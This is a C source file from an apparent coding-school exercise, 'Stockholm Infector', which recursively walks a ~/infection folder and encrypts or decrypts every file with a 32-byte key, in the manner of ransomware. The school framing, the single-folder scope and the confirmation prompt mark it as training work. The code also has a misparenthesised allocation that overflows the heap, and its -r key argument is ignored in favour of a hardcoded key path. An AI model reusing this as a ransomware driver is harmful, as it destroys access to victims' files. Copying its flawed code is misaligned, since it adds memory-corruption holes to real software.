/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   stockholm.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: nghaddar <nghaddar@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/08/22 11:52:15 by nghaddar          #+#    #+#             */
/*   Updated: 2025/09/12 14:15:38 by nghaddar         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "stockholm.h"

unsigned char SILENT_FLAG = 0;
unsigned char REVERSE_FLAG = 0;
unsigned char *key = NULL;

static void	print_help()
{
	puts("help: ./stockholm [-hvs] [-r key]");
	puts("-h | --help: prints this help.");
	puts("-v | --version: prints the program version number.");
	puts("-r | --reverse (key file): reverse the infection with the key provided as an argument");
	puts("-s | --silent: do not output current operations");
}

void	launch_attack(char *path)
{
	DIR				*dp = NULL;
	struct dirent	*dip = NULL;
	char			*new_path = NULL;

	dp = opendir(path);
	if (!dp)
	{
		perror("ERROR:");
		exit(1);
	}
	
	if (!SILENT_FLAG)
		printf(ANSI_YELLOW "\nEntering directory \"%s\" -->\n" ANSI_RESET, path);
		
	dip = readdir(dp);
	dip = readdir(dp);
	// these lines skip "." & ".."
	while ((dip = readdir(dp)) != NULL)
	{
		if (dip->d_type == DT_DIR)
		{
			new_path = malloc(strlen(path) + strlen(dip->d_name) + 2);
			sprintf(new_path, "%s%c", path, '/');
			sprintf(new_path + strlen(new_path), "%s", dip->d_name);
			launch_attack(new_path);
			free(new_path);
		}
		else
		{
			char *abs_filepath = malloc(strlen(path) + strlen(dip->d_name) + 2);
			sprintf(abs_filepath, "%s%c%s", path, '/', dip->d_name);

			if (!REVERSE_FLAG)
				encrypt_file(abs_filepath);
			else
				decrypt_file(abs_filepath);
				
			free(abs_filepath);
		}
	}
	closedir(dp);
}

static unsigned char	*get_key(char *keyfilepath)
{
	FILE	*keyfile = NULL;

	if (keyfilepath)
		keyfile = fopen(keyfilepath, "rb");
		
	if (!keyfile){
		perror(ANSI_RED "Can't open key file");
		exit(1);
	}

	if (!(key = malloc(sizeof(unsigned char) * 32))){
		errno = ENOMEM;
		perror(NULL);
		exit(1);
	}
	
	if (fread(key, 1, 32, keyfile) < 32)
	{
		fputs(ANSI_RED "ERROR: key should be 32 bytes long\n", stderr);
		free(key);
		exit(1);
	}
	
	fclose(keyfile);
	if (!SILENT_FLAG)
	{
		printf("current key: ");
		puts(ANSI_MAGENTA);
		for (int i = 0; i < 31; i++)
			printf("%X:", key[i]);
		printf("%X\n", key[31]);
		puts(ANSI_RESET);
	}

	return (key);
}

int		main(int argc, char **argv)
{
	int				opt;
	char			*keyfilepath = NULL;
	char			*homepath = NULL;
	unsigned char	*key = NULL;
	int				choice = 0;

	struct option long_options[] = 
	{
		{"help", no_argument, NULL, 'h'},
		{"version", no_argument, NULL, 'v'},
		{"reverse", required_argument, NULL, 'r'},
		{"silent", no_argument, NULL, 's'},
		{0, 0, 0, 0}
	};

	while ((opt = getopt_long(argc, argv, "hvr:s", long_options, NULL)) != -1)
	{
		switch (opt)
		{
			case 0:
			case 'h':
				print_help();
				return (0);
				break;
			case 'v':
				puts("Stockholm Infector\nVersion: 1.0.0");
				return (0);
				break;
			case 'r':
				REVERSE_FLAG = 1;
				keyfilepath = malloc(strlen(optarg) + 1);
				keyfilepath = strcpy(keyfilepath, optarg);
				break;
			case 's':
				SILENT_FLAG = 1;
				break;
			case '?':
				puts("help: ./stokholm -h | --help");
				return (1);
			default:
				break;
		}
	}

	homepath = malloc(strlen(getenv("HOME") + strlen("/infection") + 1));
	sprintf(homepath, "%s/%s", getenv("HOME"), "infection");

	if (!SILENT_FLAG){	
		puts(ANSI_RED);
		(REVERSE_FLAG) ? puts("== REVERSE MODE ==") : puts("== ATTACK MODE ==");
		puts(ANSI_RESET);
	}
		
	key = get_key("../key/key.key");
	printf(ANSI_RED "Stockholm is about to target path: %s\nConfirm (y/n)?: " ANSI_RESET, homepath);
	choice = getchar();
	if (choice != 'Y' && choice != 'y')
		return (0);
	
	launch_attack(homepath);
	if (!SILENT_FLAG)
		puts(ANSI_CYAN "Stockholm Infector has terminated its operations." ANSI_RESET);
		
	free(key);
	free(keyfilepath);
	free(homepath);

	return (0);
}